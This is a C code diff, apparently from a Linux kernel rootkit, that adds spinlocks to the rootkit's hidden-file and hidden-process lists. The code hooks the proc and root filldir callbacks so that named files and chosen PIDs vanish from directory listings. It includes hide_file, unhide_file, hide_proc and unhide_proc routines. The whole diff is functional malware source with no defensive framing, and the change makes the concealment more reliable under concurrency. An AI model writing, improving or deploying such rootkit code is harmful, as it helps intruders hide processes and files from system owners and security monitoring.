@@ -33,6 +33,8 @@ LIST_HEAD(hidden_files);
 
 static DEFINE_SPINLOCK(proc_iterate_lock);
 static DEFINE_SPINLOCK(root_iterate_lock);
+static DEFINE_SPINLOCK(hidden_procs_lock);
+static DEFINE_SPINLOCK(hidden_files_lock);
 
 static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
@@ -143,9 +145,14 @@ static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t of
 {
     struct hidden_file *hf;
 
+    spin_lock(&hidden_files_lock);
     list_for_each_entry ( hf, &hidden_files, list )
     if ( ! strcmp(name, hf->name) )
+    {
+        spin_unlock(&hidden_files_lock);
         return 0;
+    }
+    spin_unlock(&hidden_files_lock);
 
     return root_filldir(__buf, name, namelen, offset, ino, d_type);
 }
@@ -171,9 +178,14 @@ static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t of
     long pid;
 
     pid = simple_strtol(name, &endp, 10);
+    spin_lock(&hidden_procs_lock);
     list_for_each_entry ( hp, &hidden_procs, list )
     if ( pid == hp->pid )
+    {
+        spin_unlock(&hidden_procs_lock);
         return 0;
+    }
+    spin_unlock(&hidden_procs_lock);
 
     return proc_filldir(__buf, name, namelen, offset, ino, d_type);
 }
@@ -215,13 +227,16 @@ void hide_file ( char *name )
         return;
     hf->name = name;
 
+    spin_lock(&hidden_files_lock);
     list_add(&hf->list, &hidden_files);
+    spin_unlock(&hidden_files_lock);
 }
 
 void unhide_file ( char *name )
 {
     struct hidden_file *hf;
 
+    spin_lock(&hidden_files_lock);
     list_for_each_entry ( hf, &hidden_files, list )
     {
         if ( !strcmp(name, hf->name) )
@@ -229,9 +244,11 @@ void unhide_file ( char *name )
             list_del(&hf->list);
             kfree(hf->name);
             kfree(hf);
-            break;
+            spin_unlock(&hidden_files_lock);
+            return;
         }
     }
+    spin_unlock(&hidden_files_lock);
 }
 
 void hide_proc ( pid_t pid )
@@ -243,22 +260,27 @@ void hide_proc ( pid_t pid )
         return;
     hp->pid = pid;
 
+    spin_lock(&hidden_procs_lock);
     list_add(&hp->list, &hidden_procs);
+    spin_unlock(&hidden_procs_lock);
 }
 
 void unhide_proc ( pid_t pid )
 {
     struct hidden_proc *hp;
 
+    spin_lock(&hidden_procs_lock);
     list_for_each_entry ( hp, &hidden_procs, list )
     {
         if ( pid == hp->pid )
         {
             list_del(&hp->list);
             kfree(hp);
-            break;
+            spin_unlock(&hidden_procs_lock);
+            return;
         }
     }
+    spin_unlock(&hidden_procs_lock);
 }
 
 #endif /* PROC_FS_HIDE_H */
